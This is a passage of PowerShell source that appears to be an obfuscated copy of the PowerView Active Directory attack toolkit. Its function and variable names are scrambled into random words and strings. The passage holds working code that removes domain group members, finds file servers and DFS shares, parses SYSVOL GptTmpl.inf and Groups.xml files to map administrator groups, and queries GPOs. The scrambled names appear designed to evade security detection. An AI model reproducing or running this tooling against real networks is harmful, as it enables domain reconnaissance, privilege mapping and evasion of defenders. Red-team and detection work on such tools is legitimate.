    BEGIN {
        $otRfppJF99 = @{
            'Identity' = $fqOhNdkk99
        }
        if ($PSBoundParameters['Domain']) { $otRfppJF99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Credential']) { $otRfppJF99['Credential'] = $DOZPHpup99 }
        $rMIYjjCH99 = sincerer @ContextArguments
        if ($rMIYjjCH99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($rMIYjjCH99.Context, $rMIYjjCH99.Identity)
            }
            catch {
                Write-Warning "[abjuration] Error finding the group identity '$fqOhNdkk99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($BlVyUnEr99 in $ztqsVgXN99) {
                if ($BlVyUnEr99 -match '.+\\.+') {
                    $otRfppJF99['Identity'] = $BlVyUnEr99
                    $qwawVuYU99 = sincerer @ContextArguments
                    if ($qwawVuYU99) {
                        $GMxPBqaF99 = $qwawVuYU99.Identity
                    }
                }
                else {
                    $qwawVuYU99 = $rMIYjjCH99
                    $GMxPBqaF99 = $BlVyUnEr99
                }
                Write-Verbose "[abjuration] Removing member '$BlVyUnEr99' from group '$fqOhNdkk99'"
                $BlVyUnEr99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($qwawVuYU99.Context, $GMxPBqaF99)
                $Group.Members.Remove($BlVyUnEr99)
                $Group.Save()
            }
        }
    }
}
function Augustan {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function spriest {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $zLdPCUTB99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($zXzbbNbr99 in $jeGdZvYa99) {
                $zLdPCUTB99['Domain'] = $zXzbbNbr99
                $KeubriUN99 = breading @SearcherArguments
                $(ForEach($PzkbutkV99 in $KeubriUN99.FindAll()) {if ($PzkbutkV99.Properties['homedirectory']) {spriest($PzkbutkV99.Properties['homedirectory'])}if ($PzkbutkV99.Properties['scriptpath']) {spriest($PzkbutkV99.Properties['scriptpath'])}if ($PzkbutkV99.Properties['profilepath']) {spriest($PzkbutkV99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $KeubriUN99 = breading @SearcherArguments
            $(ForEach($PzkbutkV99 in $KeubriUN99.FindAll()) {if ($PzkbutkV99.Properties['homedirectory']) {spriest($PzkbutkV99.Properties['homedirectory'])}if ($PzkbutkV99.Properties['scriptpath']) {spriest($PzkbutkV99.Properties['scriptpath'])}if ($PzkbutkV99.Properties['profilepath']) {spriest($PzkbutkV99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function suctioned {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $VTpAaseW99 = 'All'
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        function closeted {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $hEARZvME99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $tDzdrxPY99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $FXdWquQC99 = 8
            $psnFdsmp99 = @()
            for($i=1; $i -le $tDzdrxPY99; $i++){
                $ZphORALQ99 = $FXdWquQC99
                $FOjpWhgT99 = $FXdWquQC99 + 1
                $TrXRZErP99 = [bitconverter]::ToUInt16($bin[$ZphORALQ99..$FOjpWhgT99],0)
                $HxCKqDgG99 = $FOjpWhgT99 + 1
                $iFbOUNhH99 = $HxCKqDgG99 + $TrXRZErP99 - 1
                $deIFSGDj99 = [System.Text.Encoding]::Unicode.GetString($bin[$HxCKqDgG99..$iFbOUNhH99])
                $WyCFXNfI99 = $iFbOUNhH99 + 1
                $jkmHbNAL99 = $WyCFXNfI99 + 3
                $iVsmUtHD99 = [bitconverter]::ToUInt32($bin[$WyCFXNfI99..$jkmHbNAL99],0)
                $ZzParhJJ99 = $jkmHbNAL99 + 1
                $HyhJHSnV99 = $ZzParhJJ99 + $iVsmUtHD99 - 1
                $wmuwXKdP99 = $bin[$ZzParhJJ99..$HyhJHSnV99]
                switch -wildcard ($deIFSGDj99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $PcSHDzRd99 = 0
                        $rItkgyBB99 = 15
                        $PCfoCkRA99 = [byte[]]$wmuwXKdP99[$PcSHDzRd99..$rItkgyBB99]
                        $guid = New-Object Guid(,$PCfoCkRA99) # should match $CqnbWKbw99
                        $QoVmLyuQ99 = $rItkgyBB99 + 1
                        $aDDwRLay99 = $QoVmLyuQ99 + 1
                        $vmFAEOjV99 = [bitconverter]::ToUInt16($wmuwXKdP99[$QoVmLyuQ99..$aDDwRLay99],0)
                        $OEMdMEOb99 = $aDDwRLay99 + 1
                        $TnXialZY99 = $OEMdMEOb99 + $vmFAEOjV99 - 1
                        $KAbgzKHb99 = [System.Text.Encoding]::Unicode.GetString($wmuwXKdP99[$OEMdMEOb99..$TnXialZY99])
                        $KJOCPWkU99 = $TnXialZY99 + 1
                        $vtEDJcFr99 = $KJOCPWkU99 + 1
                        $dLiHmXaf99 = [bitconverter]::ToUInt16($wmuwXKdP99[$KJOCPWkU99..$vtEDJcFr99],0)
                        $LJqYjoUL99 = $vtEDJcFr99 + 1
                        $pjdtCocu99 = $LJqYjoUL99 + $dLiHmXaf99 - 1
                        $MLZqUSwS99 = [System.Text.Encoding]::Unicode.GetString($wmuwXKdP99[$LJqYjoUL99..$pjdtCocu99])
                        $crUmdGdW99 = $pjdtCocu99 + 1
                        $BRZjEHep99 = $crUmdGdW99 + 3
                        $type = [bitconverter]::ToUInt32($wmuwXKdP99[$crUmdGdW99..$BRZjEHep99],0)
                        $VQxKQJDx99 = $BRZjEHep99 + 1
                        $GqaHKdwD99 = $VQxKQJDx99 + 3
                        $state = [bitconverter]::ToUInt32($wmuwXKdP99[$VQxKQJDx99..$GqaHKdwD99],0)
                        $UtLWliul99 = $GqaHKdwD99 + 1
                        $uklQGSsS99 = $UtLWliul99 + 1
                        $cfalyfWy99 = [bitconverter]::ToUInt16($wmuwXKdP99[$UtLWliul99..$uklQGSsS99],0)
                        $uAllEBrZ99 = $uklQGSsS99 + 1
                        $EUcfyzzg99 = $uAllEBrZ99 + $cfalyfWy99 - 1
                        if ($cfalyfWy99 -gt 0)  {
                            $hzHumcch99 = [System.Text.Encoding]::Unicode.GetString($wmuwXKdP99[$uAllEBrZ99..$EUcfyzzg99])
                        }
                        $qUHdnkjl99 = $EUcfyzzg99 + 1
                        $tyVzLAlt99 = $qUHdnkjl99 + 7
                        $EcLkpxcH99 = $wmuwXKdP99[$qUHdnkjl99..$tyVzLAlt99] #dword lowDateTime #dword highdatetime
                        $kCeoaOiO99 = $tyVzLAlt99 + 1
                        $ZVgwNaqz99 = $kCeoaOiO99 + 7
                        $MHazDgNo99 = $wmuwXKdP99[$kCeoaOiO99..$ZVgwNaqz99]
                        $OfcFOMpM99 = $ZVgwNaqz99 + 1
                        $aiHlDUuS99 = $OfcFOMpM99 + 7
                        $xbAnvlds99 = $wmuwXKdP99[$OfcFOMpM99..$aiHlDUuS99]
                        $Svcbqhbc99 = $aiHlDUuS99  + 1
                        $EzexFroR99 = $Svcbqhbc99 + 3
                        $VTpAaseW99 = [bitconverter]::ToUInt32($wmuwXKdP99[$Svcbqhbc99..$EzexFroR99],0)
                        $UVzyuzIH99 = $EzexFroR99 + 1
                        $PoauNSkZ99 = $UVzyuzIH99 + 3
                        $ewzcoqEw99 = [bitconverter]::ToUInt32($wmuwXKdP99[$UVzyuzIH99..$PoauNSkZ99],0)
                        $ZoZYAUaM99 = $PoauNSkZ99 + 1
                        $FEAlrmHa99 = $ZoZYAUaM99 + $ewzcoqEw99 - 1
                        $OVZgJtXB99 = $wmuwXKdP99[$ZoZYAUaM99..$FEAlrmHa99]
                        $vFRkIyzx99 = $FEAlrmHa99 + 1
                        $VCWtAooG99 = $vFRkIyzx99 + 3
                        $McPsEjhQ99 = [bitconverter]::ToUInt32($wmuwXKdP99[$vFRkIyzx99..$VCWtAooG99],0)
                        $PHLzuXOs99 = $VCWtAooG99 + 1
                        $UfvTLgMW99 = $PHLzuXOs99 + $McPsEjhQ99 - 1
                        $WhFepMpz99 = $wmuwXKdP99[$PHLzuXOs99..$UfvTLgMW99]
                        $lxMtmkuQ99 = $UfvTLgMW99 + 1
                        $frTHTLeH99 = $lxMtmkuQ99 + 3
                        $bVuxbROL99 = [bitconverter]::ToUInt32($wmuwXKdP99[$lxMtmkuQ99..$frTHTLeH99],0)
                        $oeSDmABX99 = 0
                        $zDUiFral99 = $oeSDmABX99 + 3
                        $uLcRTJVy99 = [bitconverter]::ToUInt32($OVZgJtXB99[$oeSDmABX99..$zDUiFral99],0)
                        $QimvZxsd99 = $zDUiFral99 + 1
                        for($j=1; $j -le $uLcRTJVy99; $j++){
                            $aaJiVpgm99 = $QimvZxsd99
                            $lToCUNwU99 = $aaJiVpgm99 + 3
                            $KfIvRwNq99 = [bitconverter]::ToUInt32($OVZgJtXB99[$aaJiVpgm99..$lToCUNwU99],0)
                            $dbqHDmmI99 = $lToCUNwU99 + 1
                            $iVPnNdcJ99 = $dbqHDmmI99 + 7
                            $UycGZDGt99 = $OVZgJtXB99[$dbqHDmmI99..$iVPnNdcJ99]
                            $dUjFDiII99 = $iVPnNdcJ99 + 1
                            $yuKefZnX99 = $dUjFDiII99 + 3
                            $qJOYLucM99 = [bitconverter]::ToUInt32($OVZgJtXB99[$dUjFDiII99..$yuKefZnX99],0)
                            $MaCQInhf99 = $yuKefZnX99 + 1
                            $pDMKnIIS99 = $MaCQInhf99 + 3
                            $ZrLGHpOf99 = [bitconverter]::ToUInt32($OVZgJtXB99[$MaCQInhf99..$pDMKnIIS99],0)
                            $ceFosaru99 = $pDMKnIIS99 + 1
                            $EcRlZpDL99 = $ceFosaru99 + 1
                            $IcnXBbdb99 = [bitconverter]::ToUInt16($OVZgJtXB99[$ceFosaru99..$EcRlZpDL99],0)
                            $zepFnUZx99 = $EcRlZpDL99 + 1
                            $fTdTKUcA99 = $zepFnUZx99 + $IcnXBbdb99 - 1
                            $IXUJQTLb99 = [System.Text.Encoding]::Unicode.GetString($OVZgJtXB99[$zepFnUZx99..$fTdTKUcA99])
                            $MzNSMVes99 = $fTdTKUcA99 + 1
                            $rtqkiMwV99 = $MzNSMVes99 + 1
                            $gFFnRcsv99 = [bitconverter]::ToUInt16($OVZgJtXB99[$MzNSMVes99..$rtqkiMwV99],0)
                            $mvCdzjeJ99 = $rtqkiMwV99 + 1
                            $WooDYCFa99 = $mvCdzjeJ99 + $gFFnRcsv99 - 1
                            $NCyprvIp99 = [System.Text.Encoding]::Unicode.GetString($OVZgJtXB99[$mvCdzjeJ99..$WooDYCFa99])
                            $uiUtyYSL99 += "\\$IXUJQTLb99\$NCyprvIp99"
                            $QimvZxsd99 = $WooDYCFa99 + 1
                        }
                    }
                }
                $FXdWquQC99 = $HyhJHSnV99 + 1
                $ZmvHvwrr99 = @{
                    'Name' = $deIFSGDj99
                    'Prefix' = $KAbgzKHb99
                    'TargetList' = $uiUtyYSL99
                }
                $psnFdsmp99 += New-Object -TypeName PSObject -Property $ZmvHvwrr99
                $KAbgzKHb99 = $Null
                $deIFSGDj99 = $Null
                $uiUtyYSL99 = $Null
            }
            $pgGxhifM99 = @()
            $psnFdsmp99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $pgGxhifM99 += $_.split('\')[2]
                    }
                }
            }
            $pgGxhifM99
        }
        function exhuming {
            [CmdletBinding()]
            Param(
                [String]
                $jeGdZvYa99,
                [String]
                $MBPsLBEN99,
                [String]
                $YdBDxrjg99,
                [String]
                $eLpWCwqM99 = 'Subtree',
                [Int]
                $xRYvUWYi99 = 200,
                [Int]
                $vqNdfRPs99,
                [Switch]
                $CnaAXLuN99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
            )
            $ohtRAAwt99 = breading @PSBoundParameters
            if ($ohtRAAwt99) {
                $zsyvgCoq99 = @()
                $ohtRAAwt99.filter = '(&(objectClass=fTDfs))'
                try {
                    $NtqBcYnO99 = $ohtRAAwt99.FindAll()
                    $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                        $PvRupVWt99 = $_.Properties
                        $DvOZGAxi99 = $PvRupVWt99.remoteservername
                        $Pkt = $PvRupVWt99.pkt
                        $zsyvgCoq99 += $DvOZGAxi99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$PvRupVWt99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[suctioned] exhuming error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($NtqBcYnO99) {
                        try { $NtqBcYnO99.dispose() }
                        catch {
                            Write-Verbose "[suctioned] exhuming error disposing of the Results object: $_"
                        }
                    }
                    $ohtRAAwt99.dispose()
                    if ($pkt -and $pkt[0]) {
                        closeted $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$PvRupVWt99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[suctioned] exhuming error : $_"
                }
                $zsyvgCoq99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function Begin {
            [CmdletBinding()]
            Param(
                [String]
                $jeGdZvYa99,
                [String]
                $MBPsLBEN99,
                [String]
                $YdBDxrjg99,
                [String]
                $eLpWCwqM99 = 'Subtree',
                [Int]
                $xRYvUWYi99 = 200,
                [Int]
                $vqNdfRPs99,
                [Switch]
                $CnaAXLuN99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
            )
            $ohtRAAwt99 = breading @PSBoundParameters
            if ($ohtRAAwt99) {
                $zsyvgCoq99 = @()
                $ohtRAAwt99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $ohtRAAwt99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $NtqBcYnO99 = $ohtRAAwt99.FindAll()
                    $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                        $PvRupVWt99 = $_.Properties
                        $uiUtyYSL99 = $PvRupVWt99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($uiUtyYSL99[2..($uiUtyYSL99.Length-1)])
                        $zsyvgCoq99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $gtwNcUIw99 = $_.InnerText
                                if ( $gtwNcUIw99.Contains('\') ) {
                                    $TZTeEqUi99 = $gtwNcUIw99.split('\')[3]
                                    $rfHKqDFW99 = $PvRupVWt99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$TZTeEqUi99$rfHKqDFW99";'RemoteServerName'=$gtwNcUIw99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[suctioned] Begin error in parsing target : $_"
                            }
                        }
                    }
                    if ($NtqBcYnO99) {
                        try { $NtqBcYnO99.dispose() }
                        catch {
                            Write-Verbose "[suctioned] Error disposing of the Results object: $_"
                        }
                    }
                    $ohtRAAwt99.dispose()
                }
                catch {
                    Write-Warning "[suctioned] Begin error : $_"
                }
                $zsyvgCoq99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $zsyvgCoq99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($zXzbbNbr99 in $jeGdZvYa99) {
                $zLdPCUTB99['Domain'] = $zXzbbNbr99
                if ($VTpAaseW99 -match 'all|1') {
                    $zsyvgCoq99 += exhuming @SearcherArguments
                }
                if ($VTpAaseW99 -match 'all|2') {
                    $zsyvgCoq99 += Begin @SearcherArguments
                }
            }
        }
        else {
            if ($VTpAaseW99 -match 'all|1') {
                $zsyvgCoq99 += exhuming @SearcherArguments
            }
            if ($VTpAaseW99 -match 'all|2') {
                $zsyvgCoq99 += Begin @SearcherArguments
            }
        }
        $zsyvgCoq99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function adore {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $YCOkMHvh99,
        [Switch]
        $iYgKbvhJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $pEGObTSD99 = @{}
    }
    PROCESS {
        try {
            if (($YCOkMHvh99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $XjGOmMfG99 = "\\$((New-Object System.Uri($YCOkMHvh99)).Host)\SYSVOL"
                if (-not $pEGObTSD99[$XjGOmMfG99]) {
                    demilitarized -Path $XjGOmMfG99 -DOZPHpup99 $DOZPHpup99
                    $pEGObTSD99[$XjGOmMfG99] = $True
                }
            }
            $fwveTEED99 = $YCOkMHvh99
            if (-not $fwveTEED99.EndsWith('.inf')) {
                $fwveTEED99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[adore] Parsing GptTmplPath: $fwveTEED99"
            if ($PSBoundParameters['OutputObject']) {
                $vbNRrUZk99 = lubricate -Path $fwveTEED99 -iYgKbvhJ99 -ErrorAction Stop
                if ($vbNRrUZk99) {
                    $vbNRrUZk99 | Add-Member Noteproperty 'Path' $fwveTEED99
                    $vbNRrUZk99
                }
            }
            else {
                $vbNRrUZk99 = lubricate -Path $fwveTEED99 -ErrorAction Stop
                if ($vbNRrUZk99) {
                    $vbNRrUZk99['Path'] = $fwveTEED99
                    $vbNRrUZk99
                }
            }
        }
        catch {
            Write-Verbose "[adore] Error parsing $fwveTEED99 : $_"
        }
    }
    END {
        $pEGObTSD99.Keys | ForEach-Object { calibrating -Path $_ }
    }
}
function strapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $edGagiFP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $pEGObTSD99 = @{}
    }
    PROCESS {
        try {
            if (($edGagiFP99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $XjGOmMfG99 = "\\$((New-Object System.Uri($edGagiFP99)).Host)\SYSVOL"
                if (-not $pEGObTSD99[$XjGOmMfG99]) {
                    demilitarized -Path $XjGOmMfG99 -DOZPHpup99 $DOZPHpup99
                    $pEGObTSD99[$XjGOmMfG99] = $True
                }
            }
            [XML]$VlMoNhbQ99 = Get-Content -Path $edGagiFP99 -ErrorAction Stop
            $VlMoNhbQ99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $sWPGjowW99 = $_.Properties.groupName
                $NORXAZEg99 = $_.Properties.groupSid
                if (-not $NORXAZEg99) {
                    if ($sWPGjowW99 -match 'Administrators') {
                        $NORXAZEg99 = 'S-1-5-32-544'
                    }
                    elseif ($sWPGjowW99 -match 'Remote Desktop') {
                        $NORXAZEg99 = 'S-1-5-32-555'
                    }
                    elseif ($sWPGjowW99 -match 'Guests') {
                        $NORXAZEg99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $NORXAZEg99 = Ptolemy -tFiqSWVt99 $sWPGjowW99 -DOZPHpup99 $DOZPHpup99
                        }
                        else {
                            $NORXAZEg99 = Ptolemy -tFiqSWVt99 $sWPGjowW99
                        }
                    }
                }
                $ztqsVgXN99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($ztqsVgXN99) {
                    if ($_.filters) {
                        $hruVLUod99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $hruVLUod99 = $Null
                    }
                    if ($ztqsVgXN99 -isnot [System.Array]) { $ztqsVgXN99 = @($ztqsVgXN99) }
                    $AqMwiyTf99 = New-Object PSObject
                    $AqMwiyTf99 | Add-Member Noteproperty 'GPOPath' $IpWrQlzn99
                    $AqMwiyTf99 | Add-Member Noteproperty 'Filters' $hruVLUod99
                    $AqMwiyTf99 | Add-Member Noteproperty 'GroupName' $sWPGjowW99
                    $AqMwiyTf99 | Add-Member Noteproperty 'GroupSID' $NORXAZEg99
                    $AqMwiyTf99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $AqMwiyTf99 | Add-Member Noteproperty 'GroupMembers' $ztqsVgXN99
                    $AqMwiyTf99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $AqMwiyTf99
                }
            }
        }
        catch {
            Write-Verbose "[strapping] Error parsing $IpWrQlzn99 : $_"
        }
    }
    END {
        $pEGObTSD99.Keys | ForEach-Object { calibrating -Path $_ }
    }
}
function dishonesty {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $fqOhNdkk99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $vILfkrnV99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $GMxPBqaF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $DVgeqsrg99 = breading @SearcherArguments
    }
    PROCESS {
        if ($DVgeqsrg99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $dvghvbls99 = @()
                if ($zLdPCUTB99['Properties']) {
                    $vqXskDQd99 = $zLdPCUTB99['Properties']
                }
                $zLdPCUTB99['Properties'] = 'distinguishedname,dnshostname'
                $uiVSlknQ99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $zLdPCUTB99['Identity'] = $vILfkrnV99
                    $GucPfsvo99 = boozed @SearcherArguments -fnsssdap99 | Select-Object -First 1
                    if(-not $GucPfsvo99) {
                        Write-Verbose "[dishonesty] Computer '$vILfkrnV99' not found!"
                    }
                    $azPUroAG99 = $GucPfsvo99.distinguishedname
                    $uiVSlknQ99 = $GucPfsvo99.dnshostname
                }
                else {
                    $zLdPCUTB99['Identity'] = $GMxPBqaF99
                    $User = togae @SearcherArguments -fnsssdap99 | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[dishonesty] User '$GMxPBqaF99' not found!"
                    }
                    $azPUroAG99 = $User.distinguishedname
                }
